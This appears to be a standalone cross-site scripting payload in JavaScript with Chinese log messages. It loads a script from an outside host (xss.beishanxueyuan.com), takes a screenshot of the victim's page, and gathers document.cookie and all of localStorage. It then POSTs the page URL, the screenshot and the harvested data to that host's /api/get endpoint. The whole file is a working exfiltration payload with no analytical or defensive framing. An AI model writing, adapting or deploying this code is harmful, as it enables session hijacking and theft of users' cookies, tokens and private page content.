(function () {
    var s1 = document.createElement('script');
    s1.src = 'https://xss.beishanxueyuan.com/1.js';
    document.body.appendChild(s1);
  
    s1.onload = async function () {
      try {
        console.time('capture');
        // 控制截图区域和缩放
        const element = document.documentElement;
        const canvas = await html2canvas(element, { scale: 0.5 });
        console.timeEnd('capture');
  
        console.time('encode');
        const base64 = canvas.toDataURL('image/png');
        console.timeEnd('encode');
  
        const currentUrl = window.location.href;
        const currentCookie = "COOKIE:" + document.cookie + "\n" + "localStorage:" + JSON.stringify(localStorage);
  
        const requestOptions = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            url: currentUrl,
            screenshot: base64,
            cookie: currentCookie
          })
        };
  
        console.time('send');
        fetch('https://xss.beishanxueyuan.com/api/get', requestOptions)
          .then(response => {
            console.timeEnd('send');
            if (!response.ok) throw new Error('网络响应不正常');
            return response.json();
          })
          .then(data => {
            console.log('请求成功:', data);
          })
          .catch(error => {
            console.error('请求出错:', error);
          });
  
      } catch (error) {
        console.error(error);
      }
    };
  })();